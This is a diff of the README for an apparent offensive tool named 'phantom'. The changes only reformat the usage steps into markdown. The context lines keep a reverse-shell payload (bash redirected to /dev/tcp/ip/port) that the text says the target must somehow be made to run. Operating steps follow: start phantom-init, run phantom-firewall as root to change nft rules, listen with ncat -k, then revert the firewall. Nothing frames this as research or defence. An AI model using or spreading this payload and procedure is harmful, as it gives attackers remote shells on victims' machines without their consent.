@@ -42,15 +42,17 @@ You have to somehow make the target execute this code, so that he connects to th
 bash -c 'bash &>/dev/tcp/ip/1st-port 0>&1 &'
 ip and 1st-port are the ones specified above.
 
-Order of execution:
-a. Before delivering the payload:
-	1) Execute phantom-init and wait for the target to connect to your machine.
+## Order of execution
 
-b. After delivering the payload:
-	1) Execute phantom-firewall as root, so it can modify the firewall rules.
-	2) Create an ncat process listening at the 2nd-port. (use the -k flag to accept multiple connections)
+* Before delivering the payload:
+	* Execute phantom-init and wait for the target to connect to your machine.
 
-Order of closing:
+* After delivering the payload:
+	* Execute phantom-firewall as root, so it can modify the firewall rules.
+	* Create an ncat process listening at the 2nd-port. (use the -k flag to accept multiple connections)
+
+## Order of closing
+
 1.	Close phantom-firewall and wait for some seconds so the connections can start flowing normally again.
 2. 	Close the ncat listening process so all the connections get closed with it.
 3: 	Execute this command: sudo phantom-firewall -r | -R. This undoes any changes to the nft ruleset made by phantom-firewall.
